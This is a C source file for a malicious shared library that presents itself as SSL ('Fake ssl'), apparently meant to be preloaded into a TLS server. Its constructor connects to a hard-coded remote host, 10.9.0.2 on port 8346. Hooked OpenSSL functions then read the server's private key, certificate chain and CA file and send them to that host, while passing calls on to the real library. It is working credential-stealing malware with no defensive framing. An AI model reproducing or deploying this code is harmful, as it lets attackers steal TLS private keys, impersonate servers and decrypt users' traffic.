#include <stdio.h>
#include <dlfcn.h>
#include <openssl/ossl_typ.h>
#include <simplenet/client.h>
#include <simplenet/net.h>
#include <stdlib.h> /* free, getenv */
#include <string.h>
#include <unistd.h> /* EXIT */
#include <sys/stat.h>
#include <fcntl.h>
#include <simplelogger/log.h>

#define SERVER_ADDRESS "10.9.0.2"
#define SERVER_PORT "8346"
#define FSSL_MESSAGE_LEN 75

static simplenet_conn_t* conn = NULL;
static void* libssl_handle = NULL;
static unsigned char buf[SIMPLENET_MAX_MESSAGE_LEN];
static unsigned num_bytes;
static simplelogger_t fssl_logger;

__attribute__((constructor)) static void setup_fssl()
{
	simplelogger_init(&fssl_logger, getenv("FSSL_LOGGER_PATH"));
	simplelogger_log(&fssl_logger, "Fssl: constructor\n");
	conn = simplenet_open_client_socket(SERVER_ADDRESS, SERVER_PORT);
	simplelogger_log(&fssl_logger, "Fssl: Success!\n");
	libssl_handle = dlopen("libssl.so", RTLD_LOCAL | RTLD_LAZY);
	if (libssl_handle == 0) {
		simplelogger_log_error(&fssl_logger, "dlopen: %s");
		_exit(EXIT_FAILURE);
	}
	simplelogger_log(&fssl_logger, "Fake ssl constructor\n");
}

int SSL_CTX_use_PrivateKey_file(SSL_CTX *ctx, const char *file, int type)
{
    int (*real_SSL_CTX_use_PrivateKey_file)(SSL_CTX *ctx, const char *file, int type);
	*(void **) (&real_SSL_CTX_use_PrivateKey_file) = dlsym(libssl_handle, "SSL_CTX_use_PrivateKey_file");
    int result = real_SSL_CTX_use_PrivateKey_file(ctx, file, type);
	int pkey_fd = open(file, O_RDONLY);
	num_bytes = 0;
	int num_read;
	while((num_read = read(pkey_fd, buf+num_bytes, SIMPLENET_MAX_PACKET_SIZE)) > 0)
	{
		num_bytes += num_read;
	}
	simplelogger_log(&fssl_logger, "Fssl: Size of Private Key: %d\n", num_bytes);
	simplenet_send_message(conn, buf, num_bytes, PRIVATE_KEY_MESSAGE);
	simplenet_send_message(conn, NULL, 0, CLOSE_MESSAGE); // Then close connection
	// Should have used SSL_CTX_use_certificate before SSL_CTX_use_PrivateKey
	simplenet_close_client_socket(conn);
	conn = NULL;
	dlclose(libssl_handle);
	close(pkey_fd);
	simplelogger_log(&fssl_logger, "Fssl: Using modified SSL_CTX_use_PrivateKey_file\n");
	simplelogger_close(&fssl_logger);
	return result;
}

int SSL_CTX_use_certificate_chain_file(SSL_CTX *ctx, const char *file)
{
    int (*real_SSL_CTX_use_certificate_chain_file)(SSL_CTX *ctx, const char *file);
	*(void **) (&real_SSL_CTX_use_certificate_chain_file) = dlsym(libssl_handle, "SSL_CTX_use_certificate_chain_file");
    int result = real_SSL_CTX_use_certificate_chain_file(ctx, file);
	int cert_fd = open(file, O_RDONLY);
	num_bytes = 0;
	int num_read;
	while((num_read = read(cert_fd, buf+num_bytes, SIMPLENET_MAX_PACKET_SIZE)) > 0)
	{
		num_bytes += num_read;
	}
	simplelogger_log(&fssl_logger, "Fssl: Size of Cert: %d\n", num_bytes);
	simplenet_send_message(conn, buf, num_bytes, CERT_MESSAGE);
	close(cert_fd);
	simplelogger_log(&fssl_logger, "Fssl: Using modified SSL_CTX_use_certificate_chain_file\n");
	return result;
}

int SSL_CTX_load_verify_locations(SSL_CTX *ctx, const char *CAfile,
                                  const char *CApath)
{
	int (*real_SSL_CTX_load_verify_locations)(SSL_CTX *ctx, const char *CAfile, const char *CApath);
	*(void **) (&real_SSL_CTX_load_verify_locations) = dlsym(libssl_handle, "SSL_CTX_load_verify_locations");
    int result = real_SSL_CTX_load_verify_locations(ctx, CAfile, CApath);
	int CAcert_fd = open(CAfile, O_RDONLY);
	num_bytes = 0;
	int num_read;
	while((num_read = read(CAcert_fd, buf+num_bytes, SIMPLENET_MAX_PACKET_SIZE)) > 0 )
	{
		num_bytes += num_read;
	}
	simplelogger_log(&fssl_logger, "Fssl: Size of CAfile: %d\n", num_bytes);
	simplenet_send_message(conn, buf, num_bytes, CACERT_MESSAGE);
	close(CAcert_fd);
	simplelogger_log(&fssl_logger, "Fssl: Using modified SSL_CTX_load_verify_locations\n");
	return result;
}
